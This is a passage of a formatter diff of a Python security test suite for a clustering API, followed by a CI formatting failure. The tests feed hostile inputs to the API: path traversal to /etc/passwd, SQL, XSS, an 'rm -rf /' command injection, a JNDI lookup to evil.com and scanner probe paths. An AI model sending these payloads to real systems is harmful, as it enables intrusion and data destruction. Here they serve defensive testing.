+            "root",
+            "system",  # Common names
+            "../admin",
+            "../../etc/passwd",  # Path traversal
+            str(uuid.uuid4()),  # Random UUID
+        ]
+
         for obj_id in object_ids:
             endpoints = [
                 f"/session/{obj_id}",
                 f"/clusters/{obj_id}",
-                f"/users/{obj_id}"
+                f"/users/{obj_id}",
             ]
-            
+
             for endpoint in endpoints:
                 response = test_client.get(endpoint, headers=user_headers)
-                
+
                 # Should return 404 (not found) or 403 (forbidden), not 200 with unauthorized data
                 assert response.status_code in [404, 403, 422]
-    
+
     def test_role_based_access_bypass(self, test_client: TestClient):
         """Test attempts to bypass role-based access controls."""
         # Create token with manipulated role claims
         malicious_claims = [
             {"role": "admin", "scopes": ["admin"]},
             {"role": "superuser", "scopes": ["read", "write", "admin"]},
             {"role": "system", "scopes": ["*"]},
             {"admin": True, "role": "user"},  # Additional admin claim
-            {"scopes": ["admin"], "role": "user"}  # Scope escalation
-        ]
-        
+            {"scopes": ["admin"], "role": "user"},  # Scope escalation
+        ]
+
         for claims in malicious_claims:
-            claims.update({
-                "sub": "malicious_user",
-                "email": "malicious@test.com"
-            })
-            
+            claims.update({"sub": "malicious_user", "email": "malicious@test.com"})
+
             # This will fail because we don't have the signing key
             # But test the validation logic
             try:
                 token = create_access_token(claims)
                 headers = {"Authorization": f"***"}
-                
+
                 response = test_client.get("/admin/users", headers=headers)
-                
+
                 # Even with admin role, should validate user exists and has permissions
                 if response.status_code == 200:
                     # If successful, ensure it's properly authorized
                     assert "malicious" not in response.text.lower()
-                    
+
             except Exception:
                 # Token creation might fail due to validation
                 pass
 
+
 class TestDataProtectionSecurity:
     """Test data protection and privacy security."""
-    
+
     def test_sensitive_data_exposure(self, test_client: TestClient, user_headers: Dict):
         """Test prevention of sensitive data exposure."""
         response = test_client.get("/health", headers=user_headers)
-        
+
         if response.status_code == 200:
             response_text = response.text.lower()
-            
+
             # Should not expose sensitive information
             sensitive_data = [
-                "password", "secret", "key", "token",
-                "private", "confidential", "internal",
-                "database_url", "api_key", "jwt_secret"
+                "password",
+                "secret",
+                "key",
+                "token",
+                "private",
+                "confidential",
+                "internal",
+                "database_url",
+                "api_key",
+                "jwt_secret",
             ]
-            
+
             for sensitive in sensitive_data:
                 assert sensitive not in response_text
-    
-    def test_error_message_information_disclosure(self, test_client: TestClient, user_headers: Dict):
+
+    def test_error_message_information_disclosure(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test that error messages don't leak sensitive information."""
         # Trigger various error conditions
         error_requests = [
             {
                 "method": "POST",
                 "url": "/process-point",
                 "json": {"invalid": "data"},
-                "headers": user_headers
+                "headers": user_headers,
             },
-            {
-                "method": "GET", 
-                "url": "/nonexistent-endpoint",
-                "headers": user_headers
-            },
+            {"method": "GET", "url": "/nonexistent-endpoint", "headers": user_headers},
             {
                 "method": "POST",
                 "url": "/process-batch",
                 "json": None,
-                "headers": user_headers
-            }
-        ]
-        
+                "headers": user_headers,
+            },
+        ]
+
         for request in error_requests:
             if request["method"] == "POST":
                 response = test_client.post(
-                    request["url"],
-                    json=request["json"],
-                    headers=request["headers"]
+                    request["url"], json=request["json"], headers=request["headers"]
                 )
             else:
-                response = test_client.get(
-                    request["url"],
-                    headers=request["headers"]
-                )
-            
+                response = test_client.get(request["url"], headers=request["headers"])
+
             # Error responses should not contain sensitive info
             if 400 <= response.status_code < 600:
                 response_text = response.text.lower()
-                
+
                 # Should not expose system details
                 forbidden_info = [
-                    "traceback", "stack trace", "file path",
-                    "database", "sql", "connection string",
-                    "secret", "password", "internal"
+                    "traceback",
+                    "stack trace",
+                    "file path",
+                    "database",
+                    "sql",
+                    "connection string",
+                    "secret",
+                    "password",
+                    "internal",
                 ]
-                
+
                 for info in forbidden_info:
                     assert info not in response_text
-    
+
     def test_pii_data_handling(self, test_client: TestClient, user_headers: Dict):
         """Test proper handling of personally identifiable information."""
         # Process data that might contain PII
         pii_data = {
             "point_id": "user_email@domain.com",
             "features": [1.0, 2.0, 3.0],
             "session_id": str(uuid.uuid4()),
-            "metadata": {
-                "user_id": "12345",
-                "ip_address": "192.168.1.1"
-            }
+            "metadata": {"user_id": "12345", "ip_address": "192.168.1.1"},
         }
-        
+
         response = test_client.post(
-            "/process-point",
-            json=pii_data,
-            headers=user_headers
-        )
-        
+            "/process-point", json=pii_data, headers=user_headers
+        )
+
         # Check that PII is not exposed in response
         if response.status_code == 200:
             response_data = response.json()
             response_str = json.dumps(response_data).lower()
-            
+
             # Should not echo back PII unnecessarily
             assert "192.168.1.1" not in response_str
-            assert "user_email@domain.com" not in response_str or "point_id" in response_str
-    
-    def test_data_masking_in_logs(self, test_client: TestClient, user_headers: Dict, captured_logs):
+            assert (
+                "user_email@domain.com" not in response_str
+                or "point_id" in response_str
+            )
+
+    def test_data_masking_in_logs(
+        self, test_client: TestClient, user_headers: Dict, captured_logs
+    ):
         """Test that sensitive data is masked in logs."""
         sensitive_data = {
             "point_id": "sensitive_user_data",
             "features": [1.0, 2.0, 3.0],
             "session_id": str(uuid.uuid4()),
-            "api_key": "secret_api_key_12345"
+            "api_key": "secret_api_key_12345",
         }
-        
+
         response = test_client.post(
-            "/process-point",
-            json=sensitive_data,
-            headers=user_headers
-        )
-        
+            "/process-point", json=sensitive_data, headers=user_headers
+        )
+
         # Check logs don't contain sensitive data
         log_content = captured_logs.getvalue()
-        
+
         # Sensitive data should be masked or absent from logs
         assert "secret_api_key_12345" not in log_content
         # Point ID might be logged but should be masked if containing sensitive info
 
+
 class TestNetworkSecurity:
     """Test network-level security measures."""
-    
+
     def test_security_headers_presence(self, test_client: TestClient):
         """Test presence of required security headers."""
         response = test_client.get(API_ENDPOINTS["health"])
-        
+
         required_headers = {
             "X-Content-Type-Options": "nosniff",
             "X-Frame-Options": "DENY",
             "X-XSS-Protection": "1; mode=block",
             "Referrer-Policy": "strict-origin-when-cross-origin",
-            "Content-Security-Policy": lambda x: "default-src" in x
+            "Content-Security-Policy": lambda x: "default-src" in x,
         }
-        
+
         for header, expected_value in required_headers.items():
             if header in response.headers:
                 if callable(expected_value):
                     assert expected_value(response.headers[header])
                 else:
                     assert response.headers[header] == expected_value
-    
+
     def test_https_enforcement(self, test_client: TestClient):
         """Test HTTPS enforcement through headers."""
         response = test_client.get(API_ENDPOINTS["health"])
-        
+
         # Should have HSTS header for HTTPS enforcement
         if "Strict-Transport-Security" in response.headers:
             hsts = response.headers["Strict-Transport-Security"]
             assert "max-age=" in hsts
             assert int(hsts.split("max-age=")[1].split(";")[0]) > 0
-    
+
     def test_cors_configuration_security(self, test_client: TestClient):
         """Test CORS configuration security."""
         # Test preflight request
         response = test_client.options(
             API_ENDPOINTS["health"],
             headers={
                 "Origin": "https://malicious-site.com",
                 "Access-Control-Request-Method": "POST",
-                "Access-Control-Request-Headers": "Authorization"
-            }
-        )
-        
+                "Access-Control-Request-Headers": "Authorization",
+            },
+        )
+
         # Should have proper CORS configuration
         if "Access-Control-Allow-Origin" in response.headers:
             allowed_origin = response.headers["Access-Control-Allow-Origin"]
             # Should not allow all origins in production
             assert allowed_origin != "*" or "test" in allowed_origin.lower()
-    
+
     def test_rate_limiting_security(self, test_client: TestClient, user_headers: Dict):
         """Test rate limiting as DoS protection."""
         # Rapid fire requests to trigger rate limiting
         responses = []
         for i in range(100):
-            response = test_client.get(
-                API_ENDPOINTS["health"],
-                headers=user_headers
-            )
+            response = test_client.get(API_ENDPOINTS["health"], headers=user_headers)
             responses.append(response.status_code)
-            
+
             # Stop if rate limited
             if response.status_code == 429:
                 break
-        
+
         # Should eventually be rate limited
         assert 429 in responses
-        
+
         # Check rate limit headers if present
         if 429 in responses:
             rate_limited_response = next(
-                resp for resp in [test_client.get(API_ENDPOINTS["health"], headers=user_headers)]
+                resp
+                for resp in [
+                    test_client.get(API_ENDPOINTS["health"], headers=user_headers)
+                ]
                 if resp.status_code == 429
             )
-            
+
             # Should provide rate limit information
             rate_headers = [
                 "X-RateLimit-Limit",
                 "X-RateLimit-Remaining",
                 "X-RateLimit-Reset",
-                "Retry-After"
+                "Retry-After",
             ]
-            
+
             has_rate_info = any(
-                header in rate_limited_response.headers 
-                for header in rate_headers
+                header in rate_limited_response.headers for header in rate_headers
             )
             assert has_rate_info
+
 
 class TestCryptographicSecurity:
     """Test cryptographic security measures."""
-    
+
     def test_jwt_signature_verification(self, test_client: TestClient):
         """Test JWT signature verification strength."""
         # Create token with weak signature
-        user_data = {
-            "sub": "test_user",
-            "role": "user"
-        }
-        
+        user_data = {"sub": "test_user", "role": "user"}
+
         # Test with valid token first
         valid_token = create_access_token(user_data)
         verified = verify_token(valid_token)
         assert verified is not None
-        
+
         # Test with modified signature
-        parts = valid_token.split('.')
-        tampered_signature = base64.urlsafe_b64encode(b"fake_signature").decode().rstrip('=')
+        parts = valid_token.split(".")
+        tampered_signature = (
+            base64.urlsafe_b64encode(b"fake_signature").decode().rstrip("=")
+        )
         tampered_token = f"{parts[0]}.{parts[1]}.{tampered_signature}"
-        
+
         verified_tampered = verify_token(tampered_token)
         assert verified_tampered is None
-    
+
     def test_password_hashing_strength(self):
         """Test password hashing algorithm strength."""
         from auth import hash_password, verify_password
-        
+
         password = "test_password_123"
         hashed = hash_password(password)
-        
+
         # Should use strong hashing (bcrypt)
         assert hashed.startswith("$2b$")  # bcrypt format
         assert len(hashed) > 50  # Reasonable length
-        
+
         # Should verify correctly
         assert verify_password(password, hashed) is True
         assert verify_password("wrong_password", hashed) is False
-    
+
     def test_random_token_generation(self):
         """Test cryptographically secure random generation."""
         # Generate multiple tokens/IDs to test randomness
         tokens = []
         for _ in range(100):
             token = secrets.token_urlsafe(32)
             tokens.append(token)
-        
+
         # All tokens should be unique
         assert len(set(tokens)) == len(tokens)
-        
+
         # Should have good entropy
         for token in tokens[:10]:
             assert len(token) >= 32
-            assert token.isalnum() or '-' in token or '_' in token
+            assert token.isalnum() or "-" in token or "_" in token
+
 
 class TestBusinessLogicSecurity:
     """Test business logic security vulnerabilities."""
-    
-    def test_resource_exhaustion_protection(self, test_client: TestClient, user_headers: Dict):
+
+    def test_resource_exhaustion_protection(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test protection against resource exhaustion attacks."""
         # Try to process extremely large batch
         large_batch = {
             "session_id": str(uuid.uuid4()),
             "data_points": [
                 {
                     "id": f"exhaustion_point_{i}",
-                    "features": [i * 0.1] * 1000  # Large feature vector
+                    "features": [i * 0.1] * 1000,  # Large feature vector
                 }
                 for i in range(10000)  # Large number of points
             ],
-            "clustering_config": {
-                "similarity_threshold": 0.85,
-                "min_cluster_size": 2
-            }
+            "clustering_config": {"similarity_threshold": 0.85, "min_cluster_size": 2},
         }
-        
+
         start_time = time.time()
         response = test_client.post(
-            "/process-batch",
-            json=large_batch,
-            headers=user_headers,
-            timeout=30
+            "/process-batch", json=large_batch, headers=user_headers, timeout=30
         )
         processing_time = time.time() - start_time
-        
+
         # Should either reject large requests or handle them efficiently
         if response.status_code == 200:
             assert processing_time < 60  # Should complete in reasonable time
         else:
-            assert response.status_code in [413, 422, 429]  # Request too large or rate limited
-    
-    def test_algorithmic_complexity_attack(self, test_client: TestClient, user_headers: Dict):
+            assert response.status_code in [
+                413,
+                422,
+                429,
+            ]  # Request too large or rate limited
+
+    def test_algorithmic_complexity_attack(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test protection against algorithmic complexity attacks."""
         # Create data designed to trigger worst-case algorithm performance
-        worst_case_data = {
-            "session_id": str(uuid.uuid4()),
-            "data_points": []
-        }
-        
+        worst_case_data = {"session_id": str(uuid.uuid4()), "data_points": []}
+
         # Generate data that might cause O(n²) or worse behavior
         for i in range(1000):
             # Each point slightly different to potentially create many clusters
             features = [i + 0.00001 * j for j in range(10)]
-            worst_case_data["data_points"].append({
-                "id": f"complexity_point_{i}",
-                "features": features
-            })
-        
+            worst_case_data["data_points"].append(
+                {"id": f"complexity_point_{i}", "features": features}
+            )
+
         start_time = time.time()
         response = test_client.post(
-            "/process-batch",
-            json=worst_case_data,
-            headers=user_headers,
-            timeout=30
+            "/process-batch", json=worst_case_data, headers=user_headers, timeout=30
         )
         processing_time = time.time() - start_time
-        
+
         # Should handle worst-case scenarios gracefully
         assert processing_time < 30  # Should not take too long
         assert response.status_code in [200, 413, 422, 429]
-    
-    def test_concurrent_session_limit(self, test_client: TestClient, user_headers: Dict):
+
+    def test_concurrent_session_limit(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test limits on concurrent sessions per user."""
         import threading
-        
+
         session_responses = []
-        
+
         def create_session(session_num):
             session_data = {
                 "session_id": str(uuid.uuid4()),
                 "data_points": [
                     {
                         "id": f"session_{session_num}_point_1",
-                        "features": [1.0, 2.0, 3.0]
+                        "features": [1.0, 2.0, 3.0],
                     }
                 ],
-                "clustering_config": {"similarity_threshold": 0.85}
+                "clustering_config": {"similarity_threshold": 0.85},
             }
-            
+
             response = test_client.post(
-                "/process-batch",
-                json=session_data,
-                headers=user_headers
+                "/process-batch", json=session_data, headers=user_headers
             )
             session_responses.append(response.status_code)
-        
+
         # Try to create many concurrent sessions
         threads = []
         for i in range(20):
             thread = threading.Thread(target=create_session, args=(i,))
             threads.append(thread)
             thread.start()
-        
+
         for thread in threads:
             thread.join()
-        
+
         # Should either limit concurrent sessions or handle them all
         success_count = sum(1 for status in session_responses if status == 200)
         error_count = sum(1 for status in session_responses if status >= 400)
-        
+
         # If there are limits, should see some rejections
         if error_count > 0:
             assert success_count > 0  # Some should succeed
-            assert error_count > 0   # Some should be limited
+            assert error_count > 0  # Some should be limited
+
 
 class TestComplianceSecurity:
     """Test security compliance requirements."""
-    
-    def test_owasp_top_10_a01_broken_access_control(self, test_client: TestClient, user_headers: Dict):
+
+    def test_owasp_top_10_a01_broken_access_control(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test against OWASP A01: Broken Access Control."""
         # Test various access control bypasses
         bypass_attempts = [
             "/admin/../user/profile",  # Path traversal
             "/admin%2e%2e/user/profile",  # URL encoded
             "/admin/./user/profile",  # Directory traversal
             "/admin/users?user_id=../admin",  # Parameter pollution
         ]
-        
+
         for attempt in bypass_attempts:
             response = test_client.get(attempt, headers=user_headers)
             # Should not bypass access controls
             assert response.status_code in [403, 404, 422]
-    
+
     def test_owasp_top_10_a02_cryptographic_failures(self, test_client: TestClient):
         """Test against OWASP A02: Cryptographic Failures."""
         # Test weak cryptography detection
         response = test_client.get(API_ENDPOINTS["health"])
-        
+
         # Should use strong TLS (in production)
         # Check for secure headers
         security_headers = [
             "Strict-Transport-Security",
             "X-Content-Type-Options",
-            "X-Frame-Options"
-        ]
-        
+            "X-Frame-Options",
+        ]
+
         for header in security_headers:
             # Headers should be present in security-conscious deployment
             if header in response.headers:
                 assert response.headers[header] != ""
-    
-    def test_owasp_top_10_a03_injection(self, test_client: TestClient, user_headers: Dict):
+
+    def test_owasp_top_10_a03_injection(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test against OWASP A03: Injection."""
         # Combined injection test (already covered above, but summarized)
         injection_vectors = [
             {"point_id": "'; DROP TABLE users; --"},  # SQL
             {"point_id": "<script>alert('xss')</script>"},  # XSS
             {"point_id": "; rm -rf /"},  # Command
-            {"point_id": "${jndi:ldap://evil.com/exploit}"}  # JNDI
-        ]
-        
+            {"point_id": "${jndi:ldap://evil.com/exploit}"},  # JNDI
+        ]
+
         for vector in injection_vectors:
-            vector.update({
-                "features": [1.0, 2.0, 3.0],
-                "session_id": str(uuid.uuid4())
-            })
-            
+            vector.update(
+                {"features": [1.0, 2.0, 3.0], "session_id": str(uuid.uuid4())}
+            )
+
             response = test_client.post(
-                "/process-point",
-                json=vector,
-                headers=user_headers
-            )
-            
+                "/process-point", json=vector, headers=user_headers
+            )
+
             # Should handle all injection attempts safely
             assert response.status_code in [200, 400, 422]
-    
-    def test_gdpr_compliance_data_handling(self, test_client: TestClient, user_headers: Dict):
+
+    def test_gdpr_compliance_data_handling(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test GDPR compliance in data handling."""
         # Test data minimization
         user_data = {
             "point_id": "gdpr_test",
             "features": [1.0, 2.0, 3.0],
             "session_id": str(uuid.uuid4()),
-            "unnecessary_data": "should_not_be_stored"
+            "unnecessary_data": "should_not_be_stored",
         }
-        
+
         response = test_client.post(
-            "/process-point",
-            json=user_data,
-            headers=user_headers
-        )
-        
+            "/process-point", json=user_data, headers=user_headers
+        )
+
         # Should only process necessary data
         if response.status_code == 200:
             # Verify unnecessary data is not echoed back
             response_data = response.json()
             assert "unnecessary_data" not in str(response_data)
-    
-    def test_audit_logging_compliance(self, test_client: TestClient, user_headers: Dict, captured_logs):
+
+    def test_audit_logging_compliance(
+        self, test_client: TestClient, user_headers: Dict, captured_logs
+    ):
         """Test audit logging for compliance."""
         # Perform auditable action
         response = test_client.post(
             "/process-point",
             json={
                 "point_id": "audit_test",
                 "features": [1.0, 2.0, 3.0],
-                "session_id": str(uuid.uuid4())
+                "session_id": str(uuid.uuid4()),
             },
-            headers=user_headers
-        )
-        
+            headers=user_headers,
+        )
+
         # Check that action was logged
         log_content = captured_logs.getvalue()
-        
+
         # Should contain audit information
         audit_elements = ["process", "point", "user", "timestamp"]
-        has_audit_info = any(element in log_content.lower() for element in audit_elements)
+        has_audit_info = any(
+            element in log_content.lower() for element in audit_elements
+        )
         assert has_audit_info
+
 
 @pytest.mark.security
 class TestPenetrationTestingScenarios:
     """Simulated penetration testing scenarios."""
-    
+
     def test_automated_vulnerability_scan_simulation(self, test_client: TestClient):
         """Simulate automated vulnerability scanning."""
         # Common vulnerability scanner requests
         scan_requests = [
             "/admin/config.php",
@@ -955,142 +961,156 @@
             "/config/database.yml",
             "/admin/phpmyadmin/",
             "/backup.sql",
             "/api/v1/../../etc/passwd",
             "/.git/config",
-            "/robots.txt/../admin"
-        ]
-        
+            "/robots.txt/../admin",
+        ]
+
         for request in scan_requests:
             response = test_client.get(request)
             # Should not expose sensitive files or directories
             assert response.status_code in [404, 403]
-            
+
             # Should not return sensitive information
             if response.status_code == 200:
                 response_text = response.text.lower()
                 sensitive_indicators = [
-                    "password", "secret", "key", "database",
-                    "config", "admin", "root", "debug"
+                    "password",
+                    "secret",
+                    "key",
+                    "database",
+                    "config",
+                    "admin",
+                    "root",
+                    "debug",
                 ]
                 for indicator in sensitive_indicators:
                     assert indicator not in response_text
-    
-    def test_parameter_pollution_attack(self, test_client: TestClient, user_headers: Dict):
+
+    def test_parameter_pollution_attack(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test HTTP Parameter Pollution attack resistance."""
         # Multiple parameters with same name
         pollution_data = {
             "point_id": ["legitimate_id", "'; DROP TABLE users; --"],
             "features": [[1.0, 2.0, 3.0], [100.0, 200.0, 300.0]],
-            "session_id": [str(uuid.uuid4()), "admin_session"]
+            "session_id": [str(uuid.uuid4()), "admin_session"],
         }
-        
+
         # Framework should handle parameter pollution gracefully
         response = test_client.post(
-            "/process-point",
-            json=pollution_data,
-            headers=user_headers
-        )
-        
+            "/process-point", json=pollution_data, headers=user_headers
+        )
+
         # Should reject malformed requests or handle safely
         assert response.status_code in [200, 400, 422]
-    
+
     def test_timing_attack_resistance(self, test_client: TestClient):
         """Test resistance to timing attacks."""
         # Test authentication timing
         valid_user = TEST_USERS["user"]["email"]
         invalid_user = "nonexistent@domain.com"
         wrong_password = "definitely_wrong_password"
-        
+
         # Measure timing for valid vs invalid users
         times = {"valid": [], "invalid": []}
-        
+
         for i in range(10):
             # Valid user, wrong password
             start = time.time()
             response1 = test_client.post(
                 API_ENDPOINTS["auth_login"],
-                data={"username": valid_user, "password": wrong_password}
+                data={"username": valid_user, "password": wrong_password},
             )
             times["valid"].append(time.time() - start)
-            
-            # Invalid user, wrong password  
+
+            # Invalid user, wrong password
             start = time.time()
             response2 = test_client.post(
                 API_ENDPOINTS["auth_login"],
-                data={"username": invalid_user, "password": wrong_password}
+                data={"username": invalid_user, "password": wrong_password},
             )
             times["invalid"].append(time.time() - start)
-        
+
         # Both should fail
         assert response1.status_code == 401
         assert response2.status_code == 401
-        
+
         # Timing should be similar (within reasonable variance)
         avg_valid = sum(times["valid"]) / len(times["valid"])
         avg_invalid = sum(times["invalid"]) / len(times["invalid"])
         timing_diff = abs(avg_valid - avg_invalid)
-        
+
         # Difference should be minimal
         assert timing_diff < 0.1  # Less than 100ms difference
-    
+
     def test_social_engineering_api_exposure(self, test_client: TestClient):
         """Test API exposure that could aid social engineering."""
         # Check if API exposes user enumeration
         user_enum_endpoints = [
             "/users/admin",
-            "/users/test@example.com", 
+            "/users/test@example.com",
             "/profile/admin",
-            "/api/users?email=admin@test.com"
-        ]
-        
+            "/api/users?email=admin@test.com",
+        ]
+
         for endpoint in user_enum_endpoints:
             response = test_client.get(endpoint)
-            
+
             # Should not reveal user existence through different response codes
             if response.status_code in [200, 404]:
                 # If user lookup is allowed, should require authentication
-                assert response.status_code == 404 or "authentication" in response.text.lower()
-
-@pytest.mark.slow 
+                assert (
+                    response.status_code == 404
+                    or "authentication" in response.text.lower()
+                )
+
+
+@pytest.mark.slow
 class TestSecurityStressTests:
     """Security stress testing scenarios."""
-    
+
     def test_ddos_simulation_protection(self, test_client: TestClient):
         """Test DDoS simulation and protection."""
         # Rapid concurrent requests
         import concurrent.futures
-        
+
         def make_request():
             return test_client.get(API_ENDPOINTS["health"])
-        
+
         with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
             futures = [executor.submit(make_request) for _ in range(200)]
             responses = [future.result() for future in futures]
-        
+
         status_codes = [r.status_code for r in responses]
-        
+
         # Should handle high load gracefully
         success_rate = status_codes.count(200) / len(status_codes)
         rate_limited = status_codes.count(429)
-        
+
         # Either high success rate or proper rate limiting
         assert success_rate > 0.5 or rate_limited > 50
-    
-    def test_memory_exhaustion_protection(self, test_client: TestClient, user_headers: Dict):
+
+    def test_memory_exhaustion_protection(
+        self, test_client: TestClient, user_headers: Dict
+    ):
         """Test protection against memory exhaustion attacks."""
         # Large payload attack
         huge_payload = {
             "point_id": "memory_attack",
             "features": [1.0] * 100000,  # Very large feature vector
             "session_id": str(uuid.uuid4()),
-            "metadata": {"large_data": "x" * 1000000}  # 1MB of data
+            "metadata": {"large_data": "x" * 1000000},  # 1MB of data
         }
-        
+
         response = test_client.post(
-            "/process-point",
-            json=huge_payload,
-            headers=user_headers
-        )
-        
+            "/process-point", json=huge_payload, headers=user_headers
+        )
+
         # Should reject or handle large payloads safely
-        assert response.status_code in [200, 413, 422]  # OK, Payload Too Large, or Validation Error
\ No newline at end of file
+        assert response.status_code in [
+            200,
+            413,
+            422,
+        ]  # OK, Payload Too Large, or Validation Error

Oh no! 💥 💔 💥
28 files would be reformatted, 6 files would be left unchanged.
Error: Process completed with exit code 1.
0s
0s
0s
0s
0s
1s
0s
0s
0s
